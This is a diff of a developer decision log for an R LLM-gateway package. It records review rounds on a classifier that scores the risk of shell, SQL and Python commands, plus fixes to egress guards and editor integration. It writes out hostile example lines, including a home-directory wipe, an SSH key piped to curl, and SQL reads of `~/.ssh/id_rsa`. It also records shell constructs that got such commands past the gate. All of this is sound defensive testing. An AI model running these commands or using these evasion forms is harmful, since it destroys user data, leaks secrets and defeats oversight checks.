@@ -2933,7 +2933,7 @@ first added block and a third added block (4); against the round-0 source they f
 (`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
 UTF-8 and the C locale.
 
-## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, text enters through as_utf8() (2026-10-04)
+## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, `for NAME do`, a `[[ ]]` before a reserved word and a `function NAME` body hide no command, SQL reads every literal that may name a file but a compared value, Python's writes to gptr's and R's environment variables are control, text enters through as_utf8() (2026-10-04)
 
 P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
 flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
@@ -2959,8 +2959,8 @@ classified and the higher counts; so are the Windows and the sh reading of a bac
 readings of a parameter default (round 4), and every directory a `cd` can leave the shell in
 (round 5: it may fail). Items 1-10 are the rounds 0-2 behaviour; item 11 lists what round 3
 added, item 12 what round 4 added, item 13 what round 5 added, item 14 what round 6 added,
-item 15 what round 7 (the classifier standard) added, item 16 what round 8 added and item 17
-what round 9 added.
+item 15 what round 7 (the classifier standard) added, item 16 what round 8 added, item 17
+what round 9 added and item 18 what round 10 added.
 
 **The classifier standard (coordinator decision, review round 7; it wins over the wording above
 and over items 1-14 where they differ).** (A) Level 0 means *known* read-only, never "nothing
@@ -3707,6 +3707,75 @@ below 1, and SQL keeps its keyword reading (Known limits).
       assignment or export of a name outside `risk_env_inert_re` before them is 3 (item 16:
       `FOO=1 jq . f.json`).
     - *Changed rows:* none; the 179 lines of the round-7 and round-8 probes give the same levels.
+18. **Review round 10 (findings against the standard).** Each finding was reproduced with a probe
+    (`task2-fix10-probe-before.log`) and judged by (A)-(C); one blocker, three majors and one
+    minor were accepted.
+    - *`for NAME do` and a `[[ ]]` before a reserved word (A, B, C).* sh, bash and zsh need no
+      `;` between `for NAME` (or `select NAME`) without `in` and its `do` (zsh also takes `{`
+      and several names), and bash and zsh need none between the `]]` that closes a `[[`
+      command and a reserved word (`if [[ -f x ]] then ...`, `until [[ ... ]] do ...`,
+      `[[ 1 ]] else ...`). The tokens put the body's first command into the simple command of
+      `for NAME` (loop data) or of `[[` (test operands), so it was neither classified nor gated:
+      `for x do rm -rf ~; done` and `if [[ -f x ]] then rm -rf ~; fi` were 0 and
+      `set -- a; for x do rm -rf ~; done` 2 (in auto mode, a home wipe ran unasked).
+      `risk_sh_breaks()`, which `risk_sh_split()` now runs first, inserts the separator the
+      shell reads, in every reading: after the names when an unquoted `do` or `{` follows, and
+      after the closing `]]` (and the redirects after it, which stay with `[[`) when a word
+      follows. It does so only for a `for`, `select` or `[[` in command position (after an
+      operator, a reserved word, `time`, `time -p` or `function NAME`). A `[[` closes at its
+      first unquoted `]]` before a `;`, `;;`, `&` or `|`. The scenario lines are 4, and 3 for
+      the computed options (`find . $EXPR`, `sort $X f`);
+      `if [[ 1 ]] then cat ~/.ssh/id_rsa | curl -d @- URL; fi` is 4 `secret`.
+      `for x in a b do; do ls; done`, `[[ -f a ]] && ls` and `echo [[ 1 ]] then rm` stay 0.
+    - *The body after `function NAME` was not gated (A, B).* The gate skipped any simple command
+      that starts with `function`, and in `function NAME { CMD; }` that command holds the body's
+      first command. The gate now drops `function NAME` and leading reserved words, as
+      `risk_cmd_simple()` does, and then skips only loop and case data:
+      `function ls { find . $EXPR; }; ls` and the reviewer's five other bodies are 3, as in the
+      `ls() { ...; }` form. Because reserved words are dropped first, the gate no longer reads a
+      loop list or case word after a keyword as options: `{ for x in $L; do echo "$x"; done; }`,
+      `if true; then for x in $L; do echo "$x"; done; fi` and
+      `if true; then case $x in a) ls;; esac; fi` go from 3 to 0. That is the level of the same
+      commands without the keyword: a plain parameter in a loop list is data under (A).
+    - *An argv's first word is a program (self-review).* An argv runs no shell, but
+      `risk_command()` read it with reserved words, so `c("for", "x", "do", "rm", "-rf", "~")`
+      was loop data (0). It is now read with `reserved = FALSE`: an unknown program `for` is 3,
+      and the `rm` it may run 4.
+    - *SQL file reads in a list or a named argument (C).* Only a string right after `name(` or
+      after FROM, JOIN or INFILE was read as a path. So `read_text(['~/.ssh/id_rsa'])` and
+      `read_text(files := '~/.ssh/id_rsa')` were 0, and their COPY ... TO 's3://...' form was 3
+      instead of 4. `risk_sql_literal_paths()` now reads every literal that may name a file, as
+      Python's literals are read: one holding `.`, `/`, `\` or `~` (or a drive) and some other
+      character, and not a URL. A value compared with a column (after `=`, `<>`, `<`, `>`,
+      `LIKE`, `GLOB`, `BETWEEN`, ..., or in an `IN (...)` list) is data and is not read. So
+      round 4's guard `WHERE p IN ('/etc/passwd')` stays 0, and so does `WHERE name = '.env'`.
+      Two exceptions are read: a SET statement (`SET VARIABLE p = '~/.ssh/id_rsa'`) and a named
+      argument written `name = 'v'` (DuckDB's table-function parameters). The list and named
+      forms now give the scalar form's level (3 `secret`; the COPY form 4), and MySQL's
+      double-quoted `LOAD_FILE("...")` is read too. `risk_sql_screen()` keeps the cost down.
+      P01 classes a bare file name (no directory part, drive, expansion, glob or leading dot)
+      read from the project as workspace (read level 0), unless P01 or P03 guard the name
+      (`<name>.env`, renv.lock, secret names) or a file of that name exists (a link takes its
+      target's class). Only those names are resolved on disk. A 20,000-row INSERT script with
+      path-like values classifies in 1.0 s (18 s without the screen).
+    - *Python writes to gptr's and R's environment (minor; IC-53 item 3).* gptr$py runs in R's
+      process, so Python writing its environment is Sys.setenv() in R. IC-53 item 3 makes that
+      level 4 `control` for GPTR_* and provider names, but Python's writes were 2 (an
+      os.environ read) or 1 (putenv). `risk_py_env_writes()` reads:
+      - assignments to `environ[NAME]` (augmented, chained, annotated, in a tuple) and
+        `del environ[NAME]`;
+      - environ's pop(), setdefault(), __setitem__(), __delitem__(), update() (dict keys,
+        keyword arguments, pairs), `|=`, clear() and popitem();
+      - putenv() and unsetenv();
+      - the same forms through `environb`.
+
+      A literal name of `risk_control_env` or `risk_control_env_re` is 4 `control`, and so is
+      clear(). A name the code computes is 3 `dynamic`. Any other literal name is 2 `session`,
+      as Sys.setenv() of it is. `risk_control_env` and `risk_control_env_re` are defined here
+      with the values the plan gives in P11 Task 3, and Task 3 uses them as they are.
+    - *Changed rows:* none of the 1,946 round-9 expectations changed. The 508 lines of the
+      round-5 to round-9 probes give the levels the round-9 source gives. The gate lowers the
+      three lines named above.
 Known limits (advisory classifier, not a security boundary; each shell, Python and SQL limit
 below is level 3 or the level of what can be read, never 0, except what (A) admits and the SQL
 functions named last). (A) admits a plain parameter as an operand, and as an option of a
@@ -3745,6 +3814,11 @@ line sets without export counts for its later programs (item 16), a lower-case o
 convention: programs read options from upper-case names). sed and awk are read as GNU sed, BSD
 sed, gawk and the one-true-awk read them; where they differ (BSD's labels, bracket expressions
 in awk regular expressions) the reading that runs more commands is used or the line is 3.
+A SQL literal compared with a column is data (`WHERE p = '.env'` is 0), also when the query
+then reads that column's value as a path. Python's writes to the environment are read through
+the names `environ`, `environb`, putenv and unsetenv: through another name bound to
+os.environ (`e = os.environ; e['GPTR_X'] = '1'`) they are 2 (the os.environ read), and a
+computed key next to literal ones in update() is not flagged.
 
 Validation: `progress/P11.md`, Task 2. Six blocks were added to `test-perm-classify.R`
 (145 expectations); against the plan-literal Task 2 source the file gives
@@ -3778,9 +3852,14 @@ blocks as first written (211 expectations) fail 102 against the round-7 source
 fix (`task2-fix8-red-stash.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1766 ]` at the end of
 round 8). Review round 9 added item 17 with four blocks (180 expectations) and no changed row;
 the blocks as first written (178 expectations) fail 115 against the round-8 source
-(`task2-fix9-red.log`). Final `^perm-classify$`:
-`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1946 ]` in the UTF-8 and the C locale
-(`task2-fix9-green.log`, `task2-fix9-green-C.log`).
+(`task2-fix9-red.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1946 ]` at the end of round 9).
+Review round 10 added item 18 with five blocks (174 expectations) and no changed old row. The
+four blocks as first written (144 expectations) fail 110 against the round-9 source
+(`task2-fix10-red.log`). The final test file fails 128 against a copy of the source (taken
+before the argv change) with the round-10 call sites removed and round 9's gate line restored
+(`task2-fix10-red-final.log`).
+Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2120 ]` in the UTF-8 and the C locale
+(`task2-fix10-green.log`, `task2-fix10-green-C.log`).
 
 ## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)
 
@@ -7535,10 +7614,12 @@ against the plan-literal source `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 89 ]`
 missing, the classifier call ending as an internal error); green
 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 120 ]` (`task8-green.log`; the plan's 20 tests give its 74).
 
-## D-114 - P08 gateway_run(): the built-in routes leave decision-only models alone, a root run freezes the protected ollama_local_only from human settings, the guards follow the effective endpoint, the call's replay = wins, System 1 images are refused in a conversation, colon model ids stay whole, and P17's test-side trust.get is gone (2026-10-05)
+## D-114 - P08 gateway_run(): the built-in routes leave decision-only models alone, a root run freezes the protected ollama_local_only from human settings, the guards follow the effective endpoint, the call's replay = wins, System 1 images are refused in a conversation, colon model ids stay whole, and P17's test-side trust.get is gone, and (review round 1) a session's own provider record decides egress (never the process-wide record of its id), a routed session honours the call's replay = and router:<name> must name a registered router (2026-10-05)
 
 P08 Task 9's plan-literal code (`gateway_run()`, the `builtin:gateway` routes, the guards and
 `router.call`) changed in seven ways. The plan's 30 tests are verbatim except one line (item 7).
+The first version of this entry landed in `e934f34` (P15's commit staged the whole file); items
+3, 4 and 6 and the review paragraph below are the review round 1 amendment.
 
 1. **The built-in routes decline a decision-only model** (IC-74, 07-local-ollama.md section 2;
    D-113 item 2). `nested`, `continue` and `new` match only when `gateway_model_type()` of the
@@ -7555,24 +7636,36 @@ P08 Task 9's plan-literal code (`gateway_run()`, the `builtin:gateway` routes, t
    (P06's `run_new()`). A `.run = FALSE` session gets its record when it is started, not when it
    is queued (the pending run options hold none); Task 10 starts pending runs through
    `gateway_run_start()`. The plan never set the field, so every run read the strict default.
-3. **The guards follow the effective endpoint** (D-020 item 1, D-099; Task 4 obligation).
-   `gateway_guards()` and `router_guards()` skip `egress_check()` only when P08's
-   `egress_state(<provider record>)$exempt` (offline, or a loopback endpoint with Ollama's
-   local-only control in force) or `.opts$context = "none"`; the plan skipped it for any
+3. **The guards follow the effective endpoint of the session's own record** (D-020 item 1,
+   D-099; Task 4 obligation). `gateway_guards()` (unless `.opts$context = "none"`) and
+   `router_guards()` call `gateway_egress()`, which hands P08's `egress_state()` of the provider
+   record the session uses (its rank-0 record included) to `egress_require(pid, st)`, the
+   acknowledgement part of `egress_check()` (R/gptr-config.R; `egress_check(provider_id)` is now
+   `egress_require(pid, egress_state(provider_get(id)))`). Exempt: offline, or a loopback
+   endpoint with Ollama's local-only control in force. The plan skipped the check for any
    provider with `local = TRUE`, so a LAN or remote "local" server got automatic context without
-   an acknowledgement.
+   an acknowledgement; the first version of this item still let `egress_check()` recompute the
+   exemption from the process-wide record of the id, so a call-level `lmstudio` (or `vllm`) spec
+   at a LAN or remote address was exempted by the built-in loopback record (review round 1).
 4. **The call's `replay =` overrides the process mode** (contract 3.1: `gptr.replay` is
    "overridden by the call's `replay =`"; IC-45 `replay_mode(arg)`). `gateway_replay_guard()`
    checks the replay mode with the call's argument: `replay = "auto"` lets a call run in a
    replaying process (the hint `replay_guard()` itself gives), and `replay = "replay"` refuses an
-   unrecorded provider in a process that is not replaying. The plan ignored the argument.
+   unrecorded provider in a process that is not replaying. The plan ignored the argument. A
+   routed session is checked per request: `router_guards()` (also on `router_fallback()`) reads
+   the `replay =` of the call whose run is driving the session (`gateway_run_replay()`: the call
+   record kept in the run options), since `gateway_guards()` skips `router:` sessions (review
+   round 1).
 5. **`.opts$system1_images` is refused in a conversation** (07 section 4: images are never
    silently dropped). The built-in routes signal `gptr_error_invalid_argument` (`arg =
    ".opts$system1_images"`) before anything is created; `.opts$images` attaches images to a
    conversation.
 6. **Colon model ids stay whole** (IC-74: Ollama tags such as `qwen3:1.7b`).
    `gateway_model_ref()` resolves a reference whole through P05's pure `model_resolve()` (which
-   reads a trailing thinking level itself) and accepts `router:<name>`; the plan split at the
+   reads a trailing thinking level itself) and accepts `router:<name>` only for a registered
+   router (process-wide, or the session's own on a continuation, `session =`), else
+   `gptr_error_unknown_model` as the plan's resolution gave, so a mistyped router never reaches
+   `router.call`'s default-model fallback (review round 1); the plan split at the
    first `:` and produced `ollama/qwen3:1.7b:1.7b`. `gateway_model_record()` tries the whole
    reference, and `router_model()` reads a `:<suffix>` as a thinking level only when it is one
    (as P05 and P06 do); the plan's version set `thinking` to the tag.
@@ -7589,6 +7682,22 @@ replay mode) leads to a request to the default model without those checks; a scr
 (`router:to_lan` choosing a LAN provider, default a non-offline fake) sent the request in replay
 mode without an acknowledgement. P06 should re-signal `gptr_error_egress` and
 `gptr_error_not_recorded` from `router.call` (or guard its fallback).
+
+Known gap, P13's file (recorded for the coordinator; found by code reading, not probed): P13's
+`s1_guards()` (R/s1-route.R) calls `egress_check(target$model$provider)`, which reads the
+process-wide record of that id, so a call-level classifier spec that reuses a built-in loopback
+id (for example `ollama`) at a remote address is exempted by the built-in record. P13 should
+call `egress_require(<id>, egress_state(target$provider))` as P08's guards now do.
+
+Review round 1 regression tests (`tests/testthat/test-gptr-gateway.R`): "egress reads the
+session's own provider record, never the global one of its id" (11: `lmstudio` at a LAN address
+and an inline remote `vllm` refused with `gptr_error_egress` by `gptr()` and by `router.call`,
+nothing sent, `http_handle` mocked), "a routed session's guards honour the call's replay =
+(contract 3.1, IC-45)" (4) and "router:<name> names a registered router; an unknown one is
+refused" (9); the colon test expects `unknown_model` for an unregistered `router:somewhere`.
+Red against the round-0 source `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 289 ]`
+(`task9-fix1-red-final-tests.log`; the LAN `lmstudio` call reached the mocked HTTP layer); green
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 308 ]` (`task9-fix1-green-gateway.log`).
 
 Validation: `progress/P08.md`, Task 9. Red `^gptr-gateway$` `[ FAIL 42 | WARN 0 | SKIP 0 |
 PASS 121 ]` (`dev/.validation/P08/task9-red.log`); against the plan-literal source
@@ -7667,3 +7776,143 @@ plan-literal code `[ FAIL 22 | WARN 0 | SKIP 0 | PASS 157 ]` (`task8-negative-de
 IC-74/IC-47 tests). Review round 1 (item 10): two tests (23 expectations); against the pre-fix
 source `[ FAIL 13 | WARN 1 | SKIP 0 | PASS 206 ]` (`task8-fix1-negative.log`); green
 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 219 ]` (`task8-fix1-green.log`).
+
+## D-116 - P10 member closures and namespaces: a document edit the backend refuses is an error, an execute-only member gets the process ctx and cannot be shadowed by its own schema, hidden plugin members are neither listed nor resolved, a completion pattern that is not a regular expression leaks no warning, and (review round 1) a member whose schema is a function of ctx takes `...`, a primitive `fun` keeps the formals args() gives it, and no argument can shadow the call machinery (2026-10-05)
+
+P10 Task 8's plan-literal `R/tool-namespace.R` (part 2) passes the plan's 10 blocks (51
+expectations). Probes against it (`dev/.validation/P10/task8-probe1.R`,
+`task8-probe1-plan-literal.log`; after the change `task8-probe1-after.log`) found four defects.
+No signature, class, condition field or printed text of the plan changes.
+1. **A refused document edit came back as a patch.** `member_edit()` returned
+   `ns_routed_patch()` of whatever the `doc.edit` service (P15, contract 7.0: `<gptr_tool_result>
+   or NULL`) answered. P15's `doc_edit_service()` answers an error result for a block the user
+   edited by hand ("Block ... was edited by hand; it was left unchanged."), so `gptr$edit()` at
+   the console returned a `gptr_patch` carrying that text as its message, as if the edit had been
+   made. `member_edit()` now signals `gptr_error_tool` (`tool = "edit"`, `status = "error"`, the
+   result text as message) for an `is_error` result, as an execute-only member does
+   (`ns_generated_fun()`, P02's generated `fun`). The direct tool of Task 10 returns the routed
+   result itself, so it is unaffected.
+2. **The fallback `fun` of an execute-only member** (a `deferred` spec, or a namespaced spec
+   without `fun`; P02 generates `fun` only for `exposure = "r"`) called `execute(input, NULL)`.
+   Contract 10.6 gives a dispatch whose caller passed no ctx the process ctx, and P02's generated
+   `fun` passes `ctx_default(NULL)`, so an execute that uses `ctx$ui()` or `ctx$get()` failed
+   only when called as `gptr$<name>()` from the console. It now passes `ctx_default(NULL)`. Its
+   body also read `arg_names`, `exec` and `tool_name` from the member's own frame, so a schema
+   property with one of those names shadowed them (`arg_names = "a"` made the call fail with
+   "'missing(a)' did not find an argument"). Its body is now a call of an inlined closure on the
+   inlined `base::environment()`, as `member_closure()` and P02's generated `fun` already do (G1
+   section 2.8).
+3. **Hidden plugin members.** IC-37 makes a `hidden` spec callable by gptr code only, and
+   `ns_resolve()` refuses it, but `names()`, `.DollarNames()` and `print()` of a `gptr_ns` node
+   listed it (`registry_names()`), and a namespace whose tools are all hidden was offered by
+   `gptr$<tab>` and resolved to a node that listed them. The new `ns_plugin_keys()` reads the
+   namespaced keys whose winning spec is not hidden from `registry_all("tool")`, which leaves lazy
+   placeholders unactivated (contract 10.8; a placeholder has no exposure and is kept;
+   `task8-probe2-lazy.log`); `ns_plugin_namespaces()` and `names.gptr_ns()` use it.
+4. **Completion patterns.** `ns_names()` and `.DollarNames.gptr_ns()` fall back to a prefix match
+   when `pattern` is not a regular expression, but `grepl()` warns ("TRE pattern compilation
+   error") before it errors, and only the error was caught, so the warning reached the console.
+   Both handlers now take the warning too.
+5. Documentation only: the roxygen line "Copy-safety [R4]" of `member_describe()` was read as an
+   Rd link (`Could not resolve link to topic "R4"` in the document log); it now reads "rule R4".
+
+Review round 1 (`task8-fix1-probe.R`; before `task8-fix1-probe-before.log`, after
+`task8-fix1-probe-after.log`) added items 6-8.
+6. **A schema that is a function of ctx.** Contract 9.1 lets `parameters` be a `function(ctx)`
+   evaluated at freeze, and P02 registers such a spec; for an execute-only spec P02's generated
+   `fun` is then `function(...)`. `ns_member_ok()` admits a `deferred` one, so `gptr$<tab>`
+   offered it, and a namespace node listed a namespaced one, but `member_closure()` read
+   `schema$properties` of the closure and failed ("object of type 'closure' is not
+   subsettable"). `ns_schema_formals()` now gives `...` for a schema that is not a list, as P02
+   does: the member passes its arguments as the input (`gptr$dyn(a = "x")` reaches `execute`
+   with `list(a = "x")`, and the nested gate gets the same list), and its signature is
+   `gptr$dyn(...)` (`gptr$pq$dynd(...)` for a namespaced one, not `()`).
+7. **A primitive `fun`.** P02's `kind_check_tool()` reads formals through `formals(args(fun))`
+   and registers `fun = sum`; `member_closure()`, `ns_formals_text()` and `ns_formals_schema()`
+   read `formals(fun)`, which is NULL for a primitive, so the member took no argument
+   (`m(1, 2)`: "unused arguments") and printed `gptr$total()`. The new `ns_fun_formals()` reads
+   `formals(args(fun))` (`...` for a primitive whose args() is NULL): `gptr$total(..., na.rm =
+   FALSE)`.
+8. **Arguments named like the call machinery.** Four calls were evaluated in the member's frame
+   through symbols, and R's function lookup there finds an argument first, forcing it and calling
+   it when it holds a function: `member_fun(...)` (an argument `member_fun = mean` was called in
+   place of the member's `fun`, and an unused `member_fun = stop()` was forced), `missing(x)`
+   (`missing = identity` made a supplied `x` "missing"), `substitute(x)` (the gate labels) and
+   `list(...)` (`list = identity` failed the nested call with "unused argument"). The calls now
+   inline base::missing(), base::substitute() and base::list(), and `fun` is called through a
+   symbol that names no formal (`member_fun`, dot-prefixed until it differs from all of them)
+   bound in the closure's environment, so the error call of a `fun` error still reads
+   `member_fun(...)`.
+
+The reviewer's fourth finding needed no source change: the plan's reserved-namespace test never
+registered its spec (P02 refuses the namespace `grep`), so `ns_plugin_namespaces()`'s refusal of
+a plugin namespace that a member registered later takes was untested. An added block covers it
+(one `member_refused` diagnostic after two listings, the member resolves, the plugin's members
+do not); without the filter 4 of its 5 expectations fail (`task8-fix1-mutation.R`/`.log`).
+
+Validation: `progress/P10.md`, Task 8. Eight added test blocks (47 expectations). Against the
+plan-literal source with the round-0 test file `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 88 ]`
+(`task8-red-final-plan-literal.log`); round 1's four blocks (25 expectations) against the round-0
+source `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 110 ]` (`task8-fix1-red.log`); green `^tool-namespace$`
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 129 ]` (`task8-fix1-green.log`: Task 1's 31, the plan's 51 and
+the 47 added).
+
+## D-117 - P15 IDE backend and transcript appends: an editor buffer that shows the final newline as an empty last line is clean, transcript lines are appended only to an `.R` transcript, and they are redacted before the event and the write (2026-10-05)
+
+P15 Task 11's plan-literal `doc_ide_upsert()` and `doc_transcript_append()` (`R/doc-io.R`)
+changed in three ways. Their interfaces (`doc_ide_upsert(fmt, site, up)`,
+`doc_transcript_append(path, lines, session = NULL)`) and the other Task 11 functions
+(`doc_ide_edit_range()`, `doc_ide_modify()`, `doc_ide_save()`, `doc_ide_cursor()`) are the plan's;
+one internal helper is new, `doc_ide_clean(buffer, path)`. D-107 item 4's Task 11 obligation is
+met: `doc_upsert()` sends `rstudio`, `positron` and `vscode` sites to `doc_ide_upsert()` before it
+refuses a backend no writer handles.
+
+1. **A buffer that ends in the empty line after the final newline is clean.** Report 14 section
+   4.3 saves an RStudio or VS Code buffer, and writes a Positron buffer on disk, only when the
+   buffer equals the file. The plan compared `ctx$contents` line for line with
+   `doc_read()$lines`, which leaves out the final newline. Ace (RStudio) and Monaco (Positron)
+   hold a file that ends with a newline as its lines plus an empty last line (LIKELY: no IDE runs
+   here, report 14 section 5.7; styler's RStudio addin `style_active_file()` replaces the range up
+   to `length(contents) + 1` with lines that `ensure_last_n_empty()` ends in one empty line). On
+   the plan literal a clean RStudio buffer of an ordinary script was therefore never saved, and a
+   clean Positron buffer was edited through the id-less API (the active editor, which may be the
+   console since positron#16063) instead of on disk, the path report 14 keeps for dirty buffers.
+   `doc_ide_clean()` takes both forms: the same lines, or the same lines and `""` when the file
+   ends with a newline. That empty line for a file without a final newline stays an edit (not
+   saved).
+2. **Transcript lines are appended only to an `.R` transcript** (contract 11.5: the console
+   transcript is an `.R` file). The plan appended raw lines to any path, with format
+   `doc_format_of(path) %||% "r"`. IC-52 also allows `.Rmd`, `.qmd` and `.ipynb` console targets,
+   `doc_console_site()` (Task 8) gives `.Rmd`/`.qmd` targets `backend = "transcript"`, and Task
+   13's planned `session_tree` hook appends its `# /rewind` note to every document whose blocks
+   have that backend (only its console channels check `format == "r"`). On the plan literal that
+   note left a notebook that is no longer JSON and became prose (a heading) in R Markdown or
+   Quarto, and a `.txt` or extensionless path was created. Any other format now returns FALSE
+   with nothing written and no event.
+3. **Transcript lines are redacted with the persist profile** before the `document_write` event
+   and the write (IC-74, 07 section 6 P15 row: "redacted, consented workflow records"). Task 13's
+   console callers redact already; the writer itself now keeps every caller's lines redacted.
+
+IC-74: consent comes first (`doc_upsert()` for editor sites, `doc_consent(ask = FALSE)` for
+appends; a new test pins that no editor buffer is edited without consent), a local model's tag
+(`ollama/qwen3:8b`) reaches the header in the buffer, and nothing here calls a provider.
+
+Known limits (plan behaviour, not changed): Positron's clean branch writes on disk and does not
+move the cursor (the editor reloads on its own, and an id-less cursor call may reach the
+console); a document that is no longer RStudio's active source editor is not edited (a notice),
+although RStudio could edit it by id, because reading its buffer by id needs
+`getSourceEditorContext(id)` (RStudio 2022.06+; review round 1 pins that an editor showing another
+file or an untitled buffer is never edited); an editor that reported CRLF lines with their CR
+would read as dirty (not verified). Because `doc_ide_clean()` accepts both buffer forms (item 1),
+for a file that ends with a newline a buffer whose only unsaved change is the removed final empty
+line also reads as clean, as it did on the plan literal's line-for-line comparison: RStudio's
+`documentSave()` then saves that edit with the block, and Positron writes the block on disk while
+its buffer keeps that change. This stays until a real IDE confirms how each editor reports a
+buffer.
+
+Validation: `progress/P15.md`, Task 11. Seven tests added (52 expectations; review round 1 added
+the foreign and untitled editor test, 11) after the plan's five (32, verbatim). Against the
+plan-literal source with the final test file `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 337 ]`
+(`dev/.validation/P15/task11-fix1-adapt-red-plan-literal.log`); green `^doc-io$`
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 352 ]` (`task11-fix1-green.log`), so every later plan count for
+`test-doc-io.R` is 52 higher than the plan's (on top of the D-096 and D-109 additions).
